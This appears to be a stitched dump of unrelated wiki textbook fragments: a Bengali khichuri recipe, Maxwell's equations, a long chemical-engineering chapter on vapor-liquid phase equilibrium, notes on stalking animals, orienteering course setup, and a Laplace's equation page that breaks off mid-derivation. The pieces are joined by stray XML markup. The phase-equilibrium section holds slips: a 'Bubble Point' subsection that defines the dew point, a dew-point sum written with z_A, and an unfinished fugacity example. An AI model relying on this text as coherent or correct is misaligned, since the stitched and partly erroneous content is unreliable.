==== Step 1 ====
*Rinse rice, lentils and chickpeas ( if using dried chickpeas) in cold water separately.
*Dry rice in a colander or on a flat surface.
*Leave lentils and chickpeas to soak in water for 30 minutes.
==== Step 2 ====
*Drain lentils and chickpeas; then roast them briefly until they emit an aroma, set aside to cool
*Heat water in a kettle to use later. Add it to the cooking before it boils thoroughly.
*Semi-crush cardamom, cinnamon and cloves
==== Step 3 ====
*Heat 2 tbsp butter in a heavy based pan in medium flame. Throw in bay leaf and semi-crushed spices in the hot melted butter, once they start to sputter (in less than a minute) add sliced ginger and cumin. Stir in 1-2 minutes until ginger yields a nutty flavour. Put green chili and garden pea and stir once or twice.
*Then add rice to the mixture and stir gently for 2-3 minutes making sure the oil coats it thoroughly. Add lentils, chickpeas and salt; stir again for 1-2 more minutes 
*Add hot water to the pan. The level of water should be approx 1 inch above the mixture. Lower the heat slightly, cover and [[Cookbook:Simmering|simmer]] until done. Check regularly to make sure rice does not burn at the bottom. Rice and lentils are done when there is no hard part in rice, it is medium firm, each one is easily separable, but not very soft or sticky. This should take around 10 minutes.

==== Step 4 ====
*When the rice is simmering take a separate frying pan and heat the remaining butter. Fry the onion on a medium heat until it starts to brown. 
*When rice mixture is done put onion with accompanying oil on top. Garnish with coriander
*Turn down the heat to the lowest and cover until served which should not take long.

== Ritual Eating! ==
''Bhuna khichuri'' is a romantic dish especially suited for a rainy day. Serve warm with Bengal fish curry and Chutney as a condiment.

== Tips, Notes, and Variations ==
Weight watchers may replace butter with a low fat vegetable oil or it can be omitted altogether. For oil free alternative dry toast the spices. Pour hot water over rice and lentil mix, then add onion, ginger and spices.

== Warnings ==
Slicing onions may irritate eyes. This can be avoided by cutting under water, not very convenient though! Ethnic ingredient shops often sell fried onion pack.

      <comment>/* The 4 Equations */</comment>
      <text xml:space="preserve">{{Electrodynamics}}

== Maxwells Equations ==

When James Clarke Maxwell was doing his work with electrodynamics, several of the concepts that we have been considering had not yet been introduced to the world of mathematics. For instance, vector calculus was a very young discipline, and many of the operators currently in use (Div, Curl, the Laplacian) did not exist in Maxwell's time. 

The original &quot;Maxwells Equations&quot; were a set of 20 complicated differential equations that placed a primary focus on the idea of magnetic potential (a quantity which is almost completely ignored in the modern variants of these equations).

Heinrich Hertz and Oliver Heaviside did much of the work to convert Maxwells original equations into a more convenient form. The Electric and Magnetic fields were deemed to be of primary importance, whereas the magnetic potential was dropped from the formalization. From Hertz and Heaviside we obtained the 4 equations that we know today as &quot;Maxwell's Equations&quot;.

== The 4 Equations ==

Here are Maxwell's equations. Several of these equations have been seen already in previous chapters.

{{eqn|Gauss' Law of Electrostatics}}
:&lt;math&gt;\nabla \cdot \mathbf{E} = \frac{\rho}{\varepsilon_0}&lt;/math&gt; 
{{eqn|Gauss' Law of Magnetostatics}}
:&lt;math&gt;\nabla \cdot \mathbf{B} = 0&lt;/math&gt; 
{{eqn|Faraday's Law}}
:&lt;math&gt;\nabla \times \mathbf{E} = -\frac {\partial \mathbf{B}}{\partial t}&lt;/math&gt; 
{{eqn|Ampere-Maxwell Law}}
:&lt;math&gt;\nabla \times \mathbf{B} = \mu_0 \mathbf{J} + \mu_0\varepsilon_0  \frac{\partial \mathbf{E}}{\partial t}&lt;/math&gt; 

Where: &lt;math&gt;\rho&lt;/math&gt; is the charge density, which can (and often does) depend on time and position, &lt;math&gt;\epsilon_0&lt;/math&gt; is the permittivity of free space, &lt;math&gt;\mu_0&lt;/math&gt; is the permeability of free space, and &lt;math&gt;\mathbf J&lt;/math&gt; is the current density vector, also a function of time and position.  The units used above are the standard SI units.  Inside a linear material, Maxwell's equations change by switching the permeability and permitivity of free space with the permeability and permitivity of the linear material in question.  Inside other materials which possess more complex responses to electromagnetic fields, these terms are often represented by complex numbers, or tensors.

We can write Maxwell's equations in another form, that relates each field to its sources:
By taking the curl of the third equation, we get
:&lt;math&gt;\nabla \times \nabla \times \mathbf{E}=-\frac{\partial}{\partial t} \nabla \times \mathbf{B}&lt;/math&gt;
Since
:&lt;math&gt;\nabla \times \nabla \times \mathbf{E}=\nabla (\nabla \cdot \mathbf{E})-\nabla^2 \mathbf{E}=\frac{1}{\epsilon_0}\nabla \rho-\nabla^2 \mathbf{E}&lt;/math&gt;
and since
:&lt;math&gt;\nabla \times \mathbf{B} = \mu_0 \mathbf{J} + \mu_0\varepsilon_0  \frac{\partial \mathbf{E}}{\partial t}&lt;/math&gt; 
we get
:&lt;math&gt;
\frac{1}{\epsilon_0}\nabla \rho-\nabla^2\mathbf{E}=-\frac{\partial}{\partial t}(\mu_0 \mathbf{J} + \mu_0\varepsilon_0  \frac{\partial \mathbf{E}}{\partial t})&lt;/math&gt;
or
&lt;math&gt;
\nabla^2 \mathbf{E}-\mu_0\epsilon_0 \frac{\partial^2 \mathbf{E}}{\partial t^2}=\mu_0 \frac{\partial \mathbf{J}}{\partial t} + \frac{1}{\epsilon_0} \nabla \rho&lt;/math&gt;

Similarly, 
&lt;math&gt;
\nabla^2 \mathbf{B}-\mu_0\epsilon_0 \frac{\partial^2 \mathbf{B}}{\partial t^2} = \mu_0 \nabla \times \mathbf{j}&lt;/math&gt;

== Using Tensors ==

It should be noticed, if not immediately, that the first two equations are essentially equivalent, and that the second two equations have a similar form and should be able to be put into a single form. We can use our field tensors '''F''' and '''G''' to put the 4 Maxwell's equations into two more concise equations:

:&lt;math&gt;\sum_{\mu}\frac{\partial \mathbb{F}_{\mu\nu}}{\partial x_\mu} = 4 \pi j_\nu&lt;/math&gt;

:&lt;math&gt;\sum_{\mu}\frac{\partial \mathbb{G}_{\mu\nu}}{\partial x_\mu} = 0&lt;/math&gt;

== Symmetry ==

You may notice that these two equations are very similar, but they are not completely symmetric. The magnetic field equations reduce because magnetic fields always have two opposite poles, whereas an electric field may have only a single charge. This lack of symmetry in these equations has prompted scientists to search for a magnetic ''monopole'', something that we will talk about in later chapters.

Besides the forms of these equations, modern &quot;unified theories&quot; of physics seeking to describe all forces of nature (including, significantly, electromagnetism and gravity) often posit the existence of monopoles. As a basic consideration, similarity and symmetry among many equations and processes in physics often leads to the discovery of entirely new entities or phenomena.  Thus, the pronounced lack of symmetry between the magnetic and electric field equations is a simple and logical reason for scientists to search for monopoles.</text>

      <text xml:space="preserve">== Phase Equlibrium ==

Many processes in chemical engineering do not only involve a single phase but a combination of two immiscible liquids, or a stream containing both gas and liquid. It is very important to recognize and be able to calculate when these phases are in '''equilibrium''' with each other, and how much is in each phase. This knowledge will be especially useful when you study separation processes, for many of these processes work by somehow distorting the equilibrium so that one phase is especially rich in one component, and the other is rich in the other component.

More specifically, there are three important criteria for different phases to be in equilibrium with each other:

# The '''temperature''' of the two phases is the same at equilibrium.
# The '''partial pressure''' of every component in the two phases is the same at equilibrium.
# The '''Gibbs free energy'''' of every component in the two phases is the same at equilibrium.

The third criteria will be explored in more depth in another course; it is a consequence of the first two criteria and the second law of thermodynamics.

== Single-Component Phase Equilibrium ==

If there is only a single component in a mixture, there is only a single possible temperature (at a given pressure) for which phase equilibrium is possible. For example, water at standard pressure (1 atm) can ''only'' remain in equilibrium at 100°C. Below this temperature, all of the water condenses, and above it, all of the water vaporizes into steam.

At a given temperature, the unique ''atmospheric'' pressure at which a pure liquid boils is called its '''vapor pressure'''. If the atmospheric pressure is higher than the vapor pressure, the liquid will not boil. Vapor pressure is strongly temperature-dependent. Water at 100°C has a vapor pressure of 1 atmosphere, which explains why water on Earth (which has an atmosphere of about 1 atm) boils at 100°C. Water at a temperature of 20°C(a typical room temperature) will only boil at pressures under 0.023 atm, which is its vapor pressure at that temperature.

== Multiple-Component Phase Equilibrium: Phase Diagrams ==

In general, chemical engineers are not dealing with single components; instead they deal with equilibrium of '''mixtures'''. When a mixture begins to boil, the vapor does '''not''', in general, have the same composition as the liquid. Instead, the substance with the lower boiling temperature (or higher vapor pressure) will have a vapor concentration higher than that with the higher boiling temperature, though '''both will be present in the vapor'''. A similar argument applies when a vapor mixture condenses.

The concentrations of the vapor and liquid when the ''overall'' concentration and one of the temperature or pressure are fixed can easily be read off of a '''phase diagram'''. In order to read and understand a phase diagram, it is necessary to understand the concepts of ''bubble point'' and ''dew point'' for a mixture.

=== Bubble Point and Dew Point ===

In order to be able to predict the phase behavior of a mixture, scientists and engineers examine the ''limits'' of phase changes, and then utilize the laws of thermodynamics to determine what happens in between those limits. The limits in the case of gas-liquid phase changes are called the '''bubble point''' and the '''dew point'''.

The names imply which one is which:

# The bubble point is the point at which the first drop of a liquid mixture begins to vaporize.
# The dew point is the point at which the first drop of a gaseous mixture begins to condense.

If you are able to plot both the bubble and the dew points on the same graph, you come up with what is called a '''Pxy''' or a '''Txy''' diagram, depending on whether it is graphed at constant temperature or constant pressure.  The &quot;xy&quot; implies that the curve is able to provide information on both liquid ''and'' vapor compositions, as we will see when we examine the thermodynamics in more detail. 

==== Txy and Pxy diagrams ====

The easier of the two diagrams to calculate (but sometimes harder to grasp intuitively) is the Pxy diagram, which is shown below for an idealized Benzene-Toluene system:

[[Image:Benztol pxy diagram.PNG]]

In order to avoid getting confused about what you're looking at, think: what causes a liquid to vaporize? Two things should come to mind:

* Increasing the temperature
* ''Decreasing'' the pressure

Therefore, the region with the ''higher'' pressure is the liquid region, and that of ''lower'' pressure is vapor, as labeled. The region in between the curves is called the '''two-phase region'''.

{{NOTE|You may be tempted to try and memorize something like ''the dew point line is on the bottom in a Pxy diagram and on the top in a Txy diagram''. This is, however, strongly discouraged, as you will very likely become confused if you depend on this type of memorizing. Instead think: '''which half of the graph will contain liquid and which half will be vapor?''' Then use the definitions of &quot;dew&quot; and &quot;bubble&quot; points to determine which line is which.}}

Now that we have this curve, what can we do with it? There are several critical pieces of information we can gather from this graph by simple techniques, which have complete analogies in the Txy diagram. First, note that the two lines intersect at &lt;math&gt; x_{Benzene} = 0 &lt;/math&gt; and at &lt;math&gt; x_{Benzene} = 1 &lt;/math&gt;. These intersections are the ''pure-component vapor pressures'' at &lt;math&gt; T = 20^oC &lt;/math&gt;, since a pure component boils at its vapor pressure. 

We can determine, given the mole fraction of one component and a pressure, whether the system is gas, liquid, or two-phase, which is critical information from a design standpoint. For example, if the Benzene composition in the Benzene-Toluene system is 40% and the pressure is 25 mmHg, the entire mixture will be vapor, whereas if the pressure is raised to 50 mmHg it will all condense. The design of a flash evaporator at 20oC would require a pressure between about 30 and 40 mmHg (the 2-phase region).

We can also determine the composition of each component in a 2-phase mixture, if we know the overall composition and the vapor pressure. First, start on the x-axis at the overall composition and go up to the pressure you want to know about. Then from this point, go left until you reach the bubble-point curve to find the ''liquid'' composition, and go to the right until you reach the dew-point curve to find the ''vapor'' composition. See the below diagram.

[[Image:Benztol phase calc example.PNG]]

This method &quot;works&quot; because the pressure must be constant between each phase while the two phases are in equilibrium. The bubble and dew compositions are the only liquid and vapor compositions that are stable at a given pressure and temperature, so the system will tend toward those values.

Another useful rule is the '''lever rule''' which can be used to calculate the ''percentage of all the material'' that is in a given phase (as opposed to the composition of the vapor). The lever rule equation is [http://www.soton.ac.uk/~pasr1/tielines.htm]:

{{box|&lt;math&gt; %Liquid = \frac{D2}{D1 + D2} &lt;/math&gt;}}
- Lever Rule

and therefore,

&lt;math&gt; %Vapor = \frac{D1}{D1 + D2} &lt;/math&gt;.

The phase whose percent you're calculating is simply the one which you are going towards for the line segment in the numerator; for example, D1 is going from the point of interest to the liquid phase, so if D1 is in the numerator then you're calculating percent of liquid.

Txy diagrams have entirely analogous rules, but just be aware that the graph is &quot;reversed&quot; somewhat in shape. It's somewhat harder to calculate even in an ideal case, requiring an iterative solution, but is more useful for isobaric (constant-pressure) systems and is worth the effort. The extreme ends of the txy diagram are the boiling temperatures of pure toluene (xb = 0) and benzene (xb = 1) at 760 mmHg.

[[Image:Benztol txy diagram.PNG]]

==== VLE phase diagram summary ====

To summarize, here's the information you can directly garner from a phase diagram. Many of these can be used for ''all'' types of phase diagrams, not just VLE.

# You can use it to tell you what phase(s) you are in at a given composition, temperature, and/or pressure.
# You can use it to tell you what the ''composition'' of each phase will be, if you're in a multiphase region.
# You can use it to tell you how ''much'' of the original solution is in each phase, if you're in a multiphase region.
# You can use it to gather some properties of the ''pure materials'' from the endpoints (though these are usually the best-known of all the mixture properties).

This data is invaluable in systems design which is why you'll be drilled with it before you graduate.

== Raoult's Law: the Simplest Case ==

The simplest case (by far) to analyze occurs when an '''ideal solution''' is in equilibrium with an ideal gas. This is potentially a good approximation when two very similar liquids (the archetypal example is benzene and toluene) are dissolved in each other. It is also a good approximation for '''solvent''' properties (NOT solute properties; there is another law for that) when a very small amount of a solute is dissolved.

In an ideal liquid, the pressure exerted by a certain component on the gas is proportional to the vapor pressure of the ''pure liquid''. The only thing that may prevent the liquid from exerting this much pressure is the fact that another component is present. Therefore, the partial pressure of the ''liquid component'' on the ''gas component'' is:

&lt;math&gt; P_A = x_A*P_A^* &lt;/math&gt;

where &lt;math&gt; P_A^* &lt;/math&gt; is the vapor pressure of pure component A.

{{NOTE|For all VLE equations, &lt;math&gt; x_A &lt;/math&gt; denote a '''liquid mole fraction''' of component A, and &lt;math&gt; y_A &lt;/math&gt; is the '''vapor mole fraction''' &lt;/math&gt; of component A.}}

Recall that the partial pressure of an ideal gas in a mixture is given by:

&lt;math&gt; P_A = y_A*P &lt;/math&gt;

Therefore, since the partial pressures must be equal at equilibrium, we have the Raoult's Law equation for each component:

{{box|'''Raoult's Law for component A'''

&lt;math&gt; y_A*P = x_A*P_{A}^* &lt;/math&gt; }}

=== Vapor Pressure Correlations ===

Unfortunately, life isn't that simple even when everything is ideal. Vapor pressure is not by any stretch of the imagination a constant. In fact, it has a very strong dependence on temperature. Therefore, people have spent a good deal of time and energy developing correlations with which to predict the vapor pressure of a given substance at any reasonable temperature.

One of the most successful correlations is called the '''Antoine Equation''', which uses three coefficients, A, B, and C, which depend on the substance being analyzed. The Antoine Equation is as follows.

{{box|'''Antoine Equation'''

&lt;math&gt; log(P_A^*) = A - \frac{B}{T+C} &lt;/math&gt;}}

{{NOTE|In the external link provided in the appendix, the logarithm is to base 10, T is in degrees Celsius, and P* is in mmHg. Other sources use different forms (for example, natural log or P* in bars) so be wary.}}

=== Bubble Point and Dew Point with Raoult's Law ===

==== Key concept ====

When calculating either a bubble point or a dew point, one quantity is key, and this is the ''overall composition'', denoted with the letter z. This is to distinguish it from the ''single-phase composition'' in either the liquid or the gas phase. It is necessary to distinguish between them because the composition of the two phases will almost always be different at equilibrium.

It is important to remember that the dew and bubble points of a multi-component mixture are ''limits''. The bubble point is the point at which a very small amount of the liquid has evaporated - so small, in fact, that in essence, ''the liquid phase composition remains the same as the overall composition''. Making this assumption, it is possible to calculate the composition of that single bubble of vapor that has formed.

Similarly, the dew point is the point at which a very small amount of the vapor has condensed, so that ''the gas phase composition remains the same as the overall composition'', and thus it is possible to calculate the composition of the single bubble of liquid.

==== Bubble Point ====

Recall that the '''dew point''' of a solution is the set of conditions (either a temperature at constant pressure or a pressure at constant temperature) at which the first drops of a vapor mixture begin to condense. 

Let us first consider how to calculate the bubble point (at a constant temperature) of a mixture of 2 components A and B, assuming that the mixture follows Raoult's Law under all conditions. To begin, write Raoult's Law for each component in the mixture.

&lt;math&gt; y_A*P = x_A*P_{A}^* &lt;/math&gt;

&lt;math&gt; y_B*P = x_B*P_{B}^* &lt;/math&gt;

We can add these two equations together to yield:

&lt;math&gt; P(y_A + y_B) = P_A^*x_A + P_B^*x_B &lt;/math&gt;

Now since &lt;math&gt; y_A &lt;/math&gt; and &lt;math&gt; y_B &lt;/math&gt; are mole fractions and A and B are the only components of the mixture, &lt;math&gt; y_A + y_B = 1 &lt;/math&gt;. In addition, recall that since we are considering the bubble point, the liquid composition is essentially equal to the overall composition. Therefore, &lt;math&gt; x_A = z_A &lt;/math&gt; and &lt;math&gt; x_B = z_B &lt;/math&gt;.

{{NOTE|This is only true at the bubble point, not in general.}}

Hence we have the following equation valid at the bubble point for an ideal equilibrium:

{{box|'''Bubble point equation for two components under Raoult's Law''' &lt;br&gt;
&lt;math&gt; P = z_A*P_A^* + z_B*P_B^*&lt;/math&gt;}}

Therefore, if the temperature and overall composition are known, the bubble pressure can be determined directly. 

If the pressure is held constant and the bubble point temperature is required, it is necessary to calculate the temperature by an iterative method. The temperature dependence is contained in the Antoine equation for vapor pressure of each component. One method to solve for the temperature is to:

# Guess a temperature
# Use the guess and the Antoine equation to calculate the vapor pressure of each component in the mixture.
# Calculate an equilibrium pressure using the bubble point pressure equation.
# If the calculated pressure does not equal the known pressure, it is necessary to change the temperature and try again.

This process is ideally suited to spreadsheet functions such as Excel's &quot;goalseek&quot; routine. An example calculation will be shown in the next section.

If there is more than one component, a similar derivation yields the following:

{{box|'''Bubble point equation for multiple components under Raoult's Law''' &lt;br&gt;
&lt;math&gt; P = \Sigma (z_i * P_i^*) &lt;/math&gt; (summed over all components i) }}

==== Dew Point ====

The Dew Point calculation is similar, although the equation that results from the derivation is somewhat more complex. The starting point is the same: assume that Raoult's Law applies to each component.

&lt;math&gt; y_A*P = x_A*P_{A}^* &lt;/math&gt;

&lt;math&gt; y_B*P = x_B*P_{B}^* &lt;/math&gt;

Now we want to eliminate the liquid compositions in a similar manner to how we eliminated the vapor compositions in the previous derivation. To do this we need to divide by the vapor pressures:

&lt;math&gt; \frac{y_A*P}{P_A^*} = x_A &lt;/math&gt;

&lt;math&gt; \frac{y_B*P}{P_B^*} = x_B &lt;/math&gt;

Adding the equations and recalling that &lt;math&gt; x_A + x_B = 1 &lt;/math&gt;, we have:

&lt;math&gt; \frac{y_A*P}{P_A^*} + \frac{y_B*P}{P_B^*} = 1 &lt;/math&gt;. 

Since this is the dew point, the gas-phase composition is essentially the overall composition, and therefore we have the following dew point equation:

{{box|'''Dew Point Equation for Two Components under Raoult's Law''' &lt;br&gt;
&lt;math&gt;\frac{1}{P} = \frac{z_A}{P_A^*} + \frac{z_B}{P_B^*} &lt;/math&gt;}}

{{NOTE|This is only valid at the dew point, just as the other equation was only valid at the bubble point.}}

For multiple components, the equation is similarly:

{{box|'''Dew Point Equation for Multiple Components under Raoult's Law''' &lt;br&gt;
&lt;math&gt; \frac{1}{P} = \Sigma ( \frac{z_A}{P_A^*} ) &lt;/math&gt;}}

By holding one variable constant, varying a second, and calculating the other two, it is possible to calculate a phase diagram from Raoult's Law. Typical Pxy and Txy diagrams derived from Raoult's Law were shown in the previous section for the benzene-toluene system.

Diagrams for systems that follow Raoult's Law are relatively &quot;nice&quot;; it can be shown that they will never have '''azeotropes''', which would be indicated by intersection of the bubble and dew point lines. In addition, since only one parameter in the equation depends on the temperature (the vapor pressure) and the pressure dependence is explicit, the dew and bubble point lines are relatively easy to calculate.

== Non-ideal VLE ==

Deviations from Raoult's Law occur because not all solutions are ideal, nor are all gas mixtures. Therefore, methods have been developed in order to take these nonidealities into account.

=== Henry's Law ===

The third non-ideal method, Henry's Law, is especially useful for '''dilute solutions''', and states that at very low concentrations, the partial pressure of the dilute component over a liquid mixture is proportional to the concentration:

{{box|'''Henry's Law''' &lt;br&gt;
For a dilute component A, &lt;math&gt; P_A = H_A*x_A &lt;/math&gt; &lt;br&gt;
where &lt;math&gt; H_A &lt;/math&gt; is a constant and &lt;math&gt; x_A &lt;/math&gt; is the liquid-phase mole fraction of A }}

This law is very similar to Raoult's Law, except that the proportionality constant is not the pure-component vapor pressure but is empirically determined from VLE data. Like the pure-component vapor pressure, the Henry's constant is dependent on temperature and the nature of component A. Unlike the pure-component vapor pressure, ''it also depends on the solvent'', so when utilizing tables of Henry's constants, make sure that the solvents match.

{{NOTE|If Henry's Law applies to one component of a two-component mixture, the other component is often concentrated enough for Raoult's Law to apply to a reasonable approximation. Therefore, for a mixture of components A and B, where A is dilute and B is concentrated, a system similar to the following is common:

&lt;math&gt; y_A*P = x_A*H_A &lt;/math&gt; &lt;br&gt;
&lt;math&gt; y_B*P = x_B*P_B^* &lt;/math&gt;}}

Henry's Law constants are generally very small, and are most useful when the concentration is less than 10% (depending on how accurate you want it, the concentration may need to be less than this).

=== Excess Gibbs Energy ===

The other two commonly-used correction parameters, the '''activity coefficient''' and the '''fugacity coefficient''', are based on how non-ideal a given phase is. For a gas, the degree of non-ideality present is called the '''residual Gibbs energy''', while for a liquid it is called '''excess Gibbs energy'''. The distinction is made because the Gibbs energy of an ideal gas and the Gibbs energy of an ideal solution are very different, as are the natures of how real solutions and real gasses deviate from ideality.

The residual Gibbs energy is based on the ideal gas and is defined as follows:

{{box|'''Residual Gibbs Energy definition (for a gas phase)''' &lt;br&gt;
&lt;math&gt; G^R = G_{real} - G_{\mbox{ideal gas}} &lt;/math&gt;}}

The '''excess Gibbs energy''' of a ''liquid'' phase is based on an ideal solution and is defined as:

{{box|'''Excess Gibbs Energy definition (for a liquid phase)''' &lt;br&gt;
&lt;math&gt; G^E = G_{real} - G_{\mbox{ideal solution}} &lt;/math&gt; }}

=== Activity Coefficients ===

The activity coefficient takes into account variation from Raoult's Law due to '''liquid''' excess Gibbs energy. It may be defined as:

{{box|&lt;math&gt;ln \gamma_i = \frac{G^E_i}{RT} &lt;/math&gt;}}

where &lt;math&gt; \gamma &lt;/math&gt; is a composition-dependent value which is also different for each component. It therefore is a measure of the effect of each component in contributing to the nonideality of the mixture. 

Raoult's Law can be extended using activity coefficients as follows:

{{box|'''Extended Raoult's Law''' &lt;br&gt;
&lt;math&gt;y_A*P = x_A*P_A^* * \gamma_i&lt;/math&gt;}}

The extended Raoult's law may be used to calculate activity coefficients: the vapor pressure and equilibrium composition are measured at a low pressure (to avoid gaseous nonideality). Then, since the activity coefficient is only weakly dependent on pressure (liquid properties often change very little with pressure), the same values of the activity coefficient may be used at higher pressures to aid in determining the change in equilibrium properties.

Once activity coefficients are determined at a wide variety of concentrations, it is often desired to condense the information into one equation. See [http://www.iupac.org/publications/pac/1995/pdf/6706x0859.pdf this publication] for an interesting read on this topic, though it will probably make more sense after you take thermodynamics, it offers a good description of what you will see.

{{NOTE|The definition of the activity coefficient implies that an ideal solution will have an activity coefficient equal to 1 (since its excess Gibbs energy is 0). Thus for an ideal solution the equilibrium equation reduces back to Raoult's law.}}

=== Fugacity Coefficients ===

The '''fugacity coefficient''' of a gas is defined in a similar way to the activity coefficient, but it is based on the ''residual'' Gibbs energy:

{{box|&lt;math&gt;ln \phi_i = \frac{G^R_i}{RT} &lt;/math&gt;}}

The fugacity coefficient of a gas depends on temperature, as can be seen clearly from the definition. It also depends heavily on the pressure. Indeed, if you have data available that relates the compressibility of a pure gas, Z, as a function of pressure at constant temperature, the fugacity can be computed using calculus or estimated (roughly) using the following equation if the change in pressure between each set of points is constant:

&lt;math&gt; ln \phi_i = \Delta P\Sigma( \frac{Z_k - 1}{P_k} ) &lt;/math&gt;

where &quot;k&quot; referring to a data point

{{NOTE|Since the compressibility (&lt;math&gt; Z_k &lt;/math&gt;) of an ideal gas is 1 regardless of what the pressure is, the fugacity coefficient of an ideal gas is 1 as well. Therefore, like the activity coefficient, the fugacity coefficient provides us with a measure of how nonideal a given gas or mixture of gasses is.}}

To do this calculation, '''it is necessary to extrapolate so that the first data point is taken at P = 0.'''. 

{{example|Given the following data:

 P (atm)      Z
 0.1          0.98
 0.2          0.96
 0.3          0.95

Calculate the fugacity coefficient at 0.2 atm and 0.3 atm.

'''Solution''': It is necessary to first extrapolate to zero pressure:

&lt;math&gt; P=0 \rightarrow Z~1.0 &lt;/math&gt;

Then insert the data into the formula:

&lt;math&gt; ln \phi_i = (0.2 - 0.1)* ( \frac{0.98 - 1}{0.1} + \frac{0.96-1}{0.2}) &lt;/math&gt; }}

{{TODO|Finish this example}}

Raoult's law can be modified to account for nonideal gasses in a similar way to its modification for nonideal liquids:

{{box|'''VLE Equation for nonideal gasses and nonideal liquids''' &lt;br&gt;
&lt;math&gt; \phi_i*y_i*P=\gamma_i*x_i*P_i^* &lt;/math&gt;}}

This equation is true except at very high pressures, a case covered in [http://web.mit.edu/10.213/www/handouts/vle.pdf this paper] briefly.

{{todo|revamp to include saturation fugacity (which I forgot to include with liquid)}}

      <text xml:space="preserve">In order to come close to an animal, trackers must remain undetected not only by the animal, but also by other animals that may alert it. Moving as quietly as possible, trackers will avoid stepping on dry leaves and twigs, and take great care when moving through dry grass.

If the trackers are in close proximity to the animal, it is important that they remain downwind of it, that is, in a position where the wind is blowing away from the animal in the direction of the tracker. They must never be in a position where their scent could be carried in the wind towards the animal and thereby alert it. It is also important that the animal does not have the opportunity to cross their tracks, since the lingering human scent will alert it. Most animals prefer to keep the wind in their faces when traveling so that they can scent danger ahead of them. Trackers will therefore usually be downwind from them as they approach the animals from behind. The wind direction may, however, have changed. If the wind direction is unfavorable, the trackers may have to leave the spoor (tracks and other indications of an animal's presence) to search for their quarry from the downwind side.

As the trackers get closer to the animal, they must make sure that they see it before it sees them. Some trackers maintain that an animal keeps looking back down its own trail, always on the alert for danger coming from behind. When the spoor is very fresh, trackers may have to leave the spoor so that the animal does not see them first. Animals usually rest facing downwind, so that they can see danger approaching from the downwind side, while they can smell danger coming from behind them. An animal may also double back on its spoor and circle downwind before settling down to rest. A predator following its trail will move past the resting animal on the upwind side before realizing that the animal had doubled back, and the resting animal will smell the predator in time to make its escape.

When stalking an animal, trackers use the cover of bushes, going down on their hands and knees where necessary. In long grass they go down on their stomachs pulling themselves forward with their elbows. The most important thing is not to attract attention by sudden movements. Trackers should take their time, moving slowly when the animal is not looking, and keeping still when the animal is looking in their direction. When stalking an animal, trackers must also be careful not to disturb other animals. A disturbed animal will give its alarm signal, thereby alerting all animals in the vicinity, including the animal being tracked down.

      <text xml:space="preserve">As the instructor, you will be responsible for setting up the course.  There are many ways to do this, but one thing that does work well is to use tent stakes to mark the control points.  When you lay out the course, make sure you do not have anything magnetic on your person, as this will throw off the compass readings for everyone.  If you could make it through an airport metal detector, you should be OK.  Be extra careful when shooting your azimuths, and write them down.  This would be a bad time to discover that your memory isn't as good as you thought it was.  If you are marking the control points, it is OK to estimate the distances.  Remember that for most people two steps equal about five feet.  Therefore, you can make a reasonable estimate of the distance if you start out on your left foot (like when you do marching and drilling), and count by fives every time your right foot touches the ground.  If you have an accurate bearing, this should be close enough.  You can also indicate the number of paces instead of the distance in feet.  Your instructions should indicate that the Pathfinder should walk a particular bearing for an ''approximate'' distance and look for the tent peg.  Then shoot the second azimuth and repeat, until they reach the final control point.  Be sure to collect the tent pegs on the way back.

      <text xml:space="preserve">{{Electrodynamics}}

In theory, Coulombs Law can solve any electrostatic problem where the charge distribution is known. However, many cases, we do not know the distribution, as in the case when we have conductors. In these cases, we have to use other methods, such as solving the Laplace equation.

== Laplace's Equation ==

If we use the Laplacian operator on the electric potential function over a region of the space where the charge density is not zero, we get a special equation called '''Poisson's Equation'''. 

{{eqn|Poisson's Equation}}
: &lt;math&gt;\nabla^2 \varphi =
{\partial^2 \varphi\over \partial x^2 } +
{\partial^2 \varphi\over \partial y^2 } +
{\partial^2 \varphi\over \partial z^2 } = -\frac{\rho}{\epsilon}
&lt;/math&gt;


If the charge density happens to be zero all over the region, the Poison's Equation becomes '''Laplace's Equation'''.
{{eqn|Laplace's Equation}}
: &lt;math&gt;\nabla^2 \varphi =
{\partial^2 \varphi\over \partial x^2 } +
{\partial^2 \varphi\over \partial y^2 } +
{\partial^2 \varphi\over \partial z^2 } = 0
&lt;/math&gt;

Notice that there could still be an electric field even if the charge density is 0. The field, of course, originates from charges, but the charges could be outside the region we are interested in.

These equation are a second-order partial differential equation. Solutions to Laplace's Equation give the correct form of the electric potential in free space, satisfying the boundary conditions of the system under analysis. From the electrical potential &amp;phi; one can calculate the electric field '''E''' using the gradient operator.

Of course, V is not unique. For any electric field, we have to set an arbitrary location (usually infinity) as having potential 0. However, it turns out that if you set the values of V at the boundaries of an region, then V is unique inside the region. This might seem obvious, but could be used to solve problems. 

Solutions to Poisson's equation (and thus Laplace equation) with specified boundary conditions can be obtained in a number of ways:
== Method of images ==
Suppose there is an infinite conducting plane at z=0. Suppose that there is a point charge q at (0,0,a), where a&gt;0. What is the induced charge on the plane? What is the voltage distribution?

This seems like a hard problem to do with Coulombs law, or even solving Laplace's equation directly. However, we know that V=0 at infinity. Since the conducting plane will be an equipotential surface, we also know that the whole plane has V=0 (since otherwise, charge would flow to and from infinity). We thus know the boundary conditions.

Let us solve a different problem: Suppose there is a point charge q at (0,0,a) and another point charge -q at (0,0,-a). What is V?
We know that &lt;math&gt;V=\frac{1}{4 \pi \epsilon_0}\left[ \frac{-q}{\sqrt{x^2+y^2+(z-a)^2}}+\frac{q}{\sqrt{x^2+y^2+(z+a)^2}} \right]&lt;/math&gt;
Notice that this V is 0 at infinity, and is 0 at the plane z=0. Thus, because of uniqueness of solution of Laplace equation after we specify boundary conditions, ''this V is the solution of original problem!'' Note the crucial role of the uniqueness theorem. Without it, no one would believe us if we claim that this is the solution of the first problem.

In general, if we have any object above an infinite conducting plane, to find the voltage distribution, we can use the method of images. We first reflect the object about the plane, and reverse the charges. This will create a mirror image (hence the name) that, together with the original charge, will create V=0 at the plane and at infinity, and thus, the potential set up by the object and the conducting plane is the same as the potential set up by the object and its mirror image.

==Separation of variables==
The method of images only work for certain distributions. However, the separation of variables is far more general.
The premise is this: Suppose that &lt;math&gt;V(x,y,z)=X(x)Y(y)Z(z)&lt;/math&gt;. X(x) is free from y and z, and so on. Of course, this is not ''necessarily'' true.
Then, Laplace equation becomes
:&lt;math&gt;YZ \frac{\partial^2 X}{\partial x^2}+XZ \frac{\partial^2 Y}{\partial y^2}+XY \frac{\partial^2 Z}{\partial z^2}=0&lt;/math&gt;
or 
